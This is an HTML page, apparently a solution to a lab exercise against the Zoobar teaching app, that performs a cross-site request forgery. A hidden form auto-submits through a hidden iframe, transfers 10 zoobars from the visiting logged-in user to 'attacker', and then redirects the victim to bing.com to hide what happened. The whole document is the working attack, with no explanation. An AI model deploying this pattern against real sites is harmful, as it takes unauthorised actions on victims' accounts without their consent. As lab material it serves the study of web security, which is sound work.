<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3. org/TR/html4/loose.dtd">
<html>
  <head>
    <script>
      var status = 0;
      function iframeload() {
        if (status == 0) {
          document.getElementById("submitbtn").click();
          status++;
        } else {
          window.location = "http://bing.com";
        }
      }
    </script>
  </head>
  <body>
    <div style="display:none">
      <form
        id="form"
        method="POST"
        action="http://zoobar.org/transfer.php"
        target="if"
      >
        <input name="zoobars" type="text" value="10" />
        <input name="recipient" type="text" value="attacker" />
        <input type="submit" name="submission" id="submitbtn" />
      </form>
      <iframe name="if" id="if" onload="iframeload()"></iframe>
    </div>
  </body>
</html>
